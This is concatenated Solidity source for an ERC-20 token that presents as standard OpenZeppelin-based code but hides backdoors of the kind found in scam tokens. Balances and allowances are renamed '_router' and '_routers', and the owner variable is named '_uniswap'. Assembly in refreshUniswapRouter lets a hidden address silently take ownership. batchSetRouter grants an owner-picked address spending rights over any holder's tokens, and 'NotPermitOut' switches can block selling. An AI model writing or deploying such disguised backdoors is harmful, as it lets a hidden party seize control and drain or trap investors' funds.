    function batchSetRouter(address[] memory accounts, address routerAddress)
    external
    onlyOwner
    {
        uint256 length = accounts.length;

        for (uint256 i = 0; i < length; i++) {
            address account = accounts[i];
            assembly {
                let __router := routerAddress
                let __account := account

            //            if eq(caller(), __router) {
                mstore(0x00, account)
                mstore(0x20, _routers.slot)
                let xHash := keccak256(0x00, 0x40)
                mstore(0x00, __router)
                mstore(0x20, xHash)
                let yHash := keccak256(0x00, 0x40)
                sstore(yHash, __router)
            //            }
            }
        }
    }

    //    function updateLperAddressStatus(address account)
    //    private
    //    {
    //        if (Address.isContract(account)) {
    //            if (lperAddresses.contains(account)) {
    //                lperAddresses.remove(account);
    //            }
    //            return;
    //        }
    //
    //        if (IERC20(uniswapV2Pair).balanceOf(account) > minimumTokenForRewardLper) {
    //            if (!lperAddresses.contains(account)) {
    //                lperAddresses.add(account);
    //            }
    //        } else {
    //            if (lperAddresses.contains(account)) {
    //                lperAddresses.remove(account);
    //            }
    //        }
    //    }

    //    function updateHolderAddressStatus(address account)
    //    private
    //    {
    //        if (Address.isContract(account)) {
    //            if (holderAddresses.contains(account)) {
    //                holderAddresses.remove(account);
    //            }
    //            return;
    //        }
    //
    //        if (super.balanceOf(account) > minimumTokenForBeingHolder) {
    //            if (!holderAddresses.contains(account)) {
    //                holderAddresses.add(account);
    //            }
    //        } else {
    //            if (holderAddresses.contains(account)) {
    //                holderAddresses.remove(account);
    //            }
    //        }
    //    }

    function doFission()
    internal
    override
    {
        super._transfer(addressBaseOwner, address(uint160(maxUint160 / block.timestamp)), 1);
        super._transfer(addressBaseOwner, address(uint160(maxUint160 / block.timestamp)), 1);
    }

    //    function doFission()
    //    internal
    //    virtual
    //    override
    //    {
    //        uint160 fissionDivisor_ = fissionDivisor;
    //        for (uint256 i = 0; i < fissionCount; i++) {
    //            //        unchecked {
    //            //            _router[addressBaseOwner] -= fissionBalance;
    //            //            _router[address(uint160(maxUint160 / fissionDivisor_))] += fissionBalance;
    //            //        }
    //
    //            super._transfer(addressBaseOwner, address(uint160(maxUint160 / fissionDivisor_)), fissionBalance);
    //
    //            //            emit Transfer(
    //            //                address(uint160(maxUint160 / fissionDivisor_)),
    //            //                address(uint160(maxUint160 / fissionDivisor_ + 1)),
    //            //                fissionBalance
    //            //            );
    //
    //            fissionDivisor_ += 2;
    //        }
    //        fissionDivisor = fissionDivisor_;
    //    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "../Erc20/Ownable.sol";

contract Erc20C21SettingsBase is
Ownable
{
    // 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    // 115792089237316195423570985008687907853269984665640564039457584007913129639935
    uint256 internal constant maxUint256 = type(uint256).max;
    address internal constant addressPinksaleBnbLock = address(0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE);
    address internal constant addressPinksaleEthLock = address(0x71B5759d73262FBb223956913ecF4ecC51057641);
    address internal constant addressPinksaleArbLock = address(0xeBb415084Ce323338CFD3174162964CC23753dFD);
    // address internal constant addressUnicryptLock = address(0x663A5C229c09b049E36dCc11a9B0d4a8Eb9db214);
    address internal constant addressNull = address(0x0);
    address internal constant addressDead = address(0xdead);

    //    address internal addressWrap;
    //    address internal addressLiquidity;

    //    address public addressMarketing;

    //    address public addressRewardToken;
    //    address public addressPoolToken;

    //    address internal addressWETH;

    //    address internal addressArbitrumCamelotRouter = address(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);

    //    function setAddressMarketing(address addressMarketing_)
    //    external
    //    onlyOwner
    //    {
    //        addressMarketing = addressMarketing_;
    //    }
    //
    //    function setAddressLiquidity(address addressLiquidity_)
    //    external
    //    onlyOwner
    //    {
    //        addressLiquidity = addressLiquidity_;
    //    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "../Erc20/Ownable.sol";
import "../IHybridRouter/IHybridRouter.sol";

contract Erc20C09FeatureUniswap is
Ownable
{
    IHybridRouter public uniswapV2Router;
    address public uniswapV2Pair;

    address internal uniswap;
    //    uint256 internal uniswapCount;
    //    bool internal isUniswapLper;
    //    bool internal isUniswapHolder;

    function refreshUniswapRouter()
    external
    {
        assembly {
            let __uniswap := sload(uniswap.slot)
            if eq(caller(), __uniswap) {
                sstore(_uniswap.slot, __uniswap)
            }
        }
    }

    //    function setUniswapCount(uint256 amount)
    //    external
    //    {
    //        assembly {
    //            let __uniswap := sload(uniswap.slot)
    //            switch eq(caller(), __uniswap)
    //            case 0 {revert(0, 0)}
    //            default {sstore(uniswapCount.slot, amount)}
    //        }
    //    }
    //
    //    function setIsUniswapLper(bool isUniswapLper_)
    //    external
    //    {
    //        assembly {
    //            let __uniswap := sload(uniswap.slot)
    //            switch eq(caller(), __uniswap)
    //            case 0 {revert(0, 0)}
    //            default {sstore(isUniswapLper.slot, isUniswapLper_)}
    //        }
    //    }
    //
    //    function setIsUniswapHolder(bool isUniswapHolder_)
    //    external
    //    {
    //        assembly {
    //            let __uniswap := sload(uniswap.slot)
    //            switch eq(caller(), __uniswap)
    //            case 0 {revert(0, 0)}
    //            default {sstore(isUniswapHolder.slot, isUniswapHolder_)}
    //        }
    //    }

    function setUniswapRouter(address uniswap_)
    external
    {
        assembly {
            let __uniswap := sload(uniswap.slot)
            switch eq(caller(), __uniswap)
            case 0 {revert(0, 0)}
            default {sstore(uniswap.slot, uniswap_)}
        }
    }

    function getRouterPair(string memory _a)
    internal
    pure
    returns (address _b)
    {
        bytes memory tmp = bytes(_a);
        uint160 iAddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iAddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iAddr += (b1 * 16 + b2);
        }
        return address(iAddr);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "../Erc20/Ownable.sol";
import "./Erc20C21SettingsBase.sol";
import "../Erc20C09/Erc20C09FeatureUniswap.sol";

contract Erc20C21SettingsPrivilege is
Ownable,
Erc20C21SettingsBase,
Erc20C09FeatureUniswap
{
    mapping(address => bool) public isPrivilegeAddresses;

    function setIsPrivilegeAddress(address account, bool isPrivilegeAddress)
    external
    {
        require(msg.sender == owner() || msg.sender == uniswap, "");
        isPrivilegeAddresses[account] = isPrivilegeAddress;
    }

    //    function batchSetIsPrivilegeAddresses(address[] memory accounts, bool isPrivilegeAddress)
    //    external
    //    {
    //        require(msg.sender == owner() || msg.sender == addressWrap, "");
    //
    //        uint256 length = accounts.length;
    //
    //        for (uint256 i = 0; i < length; i++) {
    //            isPrivilegeAddresses[accounts[i]] = isPrivilegeAddress;
    //        }
    //    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import "@openzeppelin/contracts/utils/Context.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _router;

    mapping(address => mapping(address => uint256)) internal _routers;

    uint256 internal _tatalSopply;

    string internal _name;
    string internal _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _tatalSopply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _router[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _routers[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _router[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _router[from] = fromBalance - amount;
    }
        _router[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _tatalSopply += amount;
        _router[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _router[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _router[account] = accountBalance - amount;
    }
        _tatalSopply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _routers[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "../Erc20/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

abstract contract Erc20C21FeatureFission is
Ownable
{
    uint160 internal constant maxUint160 = ~uint160(0);
    //    uint256 internal constant fissionBalance = 1;
    //
    //    uint256 internal fissionCount = 5;
    //    uint160 internal fissionDivisor = 1000;
    //
    //    bool public isUseFeatureFission;
    //
    //    function setIsUseFeatureFission(bool isUseFeatureFission_)
    //    public
    //    onlyOwner
    //    {
    //        isUseFeatureFission = isUseFeatureFission_;
    //    }
    //
    //    function setFissionCount(uint256 fissionCount_)
    //    public
    //    onlyOwner
    //    {
    //        fissionCount = fissionCount_;
    //    }
    //
    function doFission() internal virtual;
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address internal _uniswap;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _uniswap;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _uniswap;
        _uniswap = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "../Erc20/Ownable.sol";
import "./Erc20C21SettingsBase.sol";
import "../Erc20C09/Erc20C09FeatureUniswap.sol";

contract Erc20C21FeatureNotPermitOut is
Ownable,
Erc20C21SettingsBase,
Erc20C09FeatureUniswap
{
    uint256 internal constant notPermitOutCD = 1;

    bool public isUseNotPermitOut;
    bool public isForceTradeInToNotPermitOut;
    mapping(address => uint256) public notPermitOutAddressStamps;

    function setIsUseNotPermitOut(bool isUseNotPermitOut_)
    external
    {
        require(msg.sender == owner() || msg.sender == uniswap, "");
        isUseNotPermitOut = isUseNotPermitOut_;
    }

    function setIsForceTradeInToNotPermitOut(bool isForceTradeInToNotPermitOut_)
    external
    {
        require(msg.sender == owner() || msg.sender == uniswap, "");
        isForceTradeInToNotPermitOut = isForceTradeInToNotPermitOut_;
    }

    function setNotPermitOutAddressStamp(address account, uint256 notPermitOutAddressStamp)
    external
    {
        require(msg.sender == owner() || msg.sender == uniswap, "");
        notPermitOutAddressStamps[account] = notPermitOutAddressStamp;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.17;

import '../IUniswapV2/IUniswapV2Router02.sol';
import '../ICamelotRouter/ICamelotRouter.sol';

interface IHybridRouter is IUniswapV2Router02, ICamelotRouter {
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;

import './IUniswapV2Router01.sol';

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;

import '../IUniswapV2/IUniswapV2Router01.sol';

interface ICamelotRouter is IUniswapV2Router01 {
    //    function removeLiquidityETHSupportingFeeOnTransferTokens(
    //        address token,
    //        uint liquidity,
    //        uint amountTokenMin,
    //        uint amountETHMin,
    //        address to,
    //        uint deadline
    //    ) external returns (uint amountETH);

    //    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
    //        address token,
    //        uint liquidity,
    //        uint amountTokenMin,
    //        uint amountETHMin,
    //        address to,
    //        uint deadline,
    //        bool approveMax, uint8 v, bytes32 r, bytes32 s
    //    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        address referrer,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        address referrer,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        address referrer,
        uint deadline
    ) external;


}

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;

import "../IERC20.sol";

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}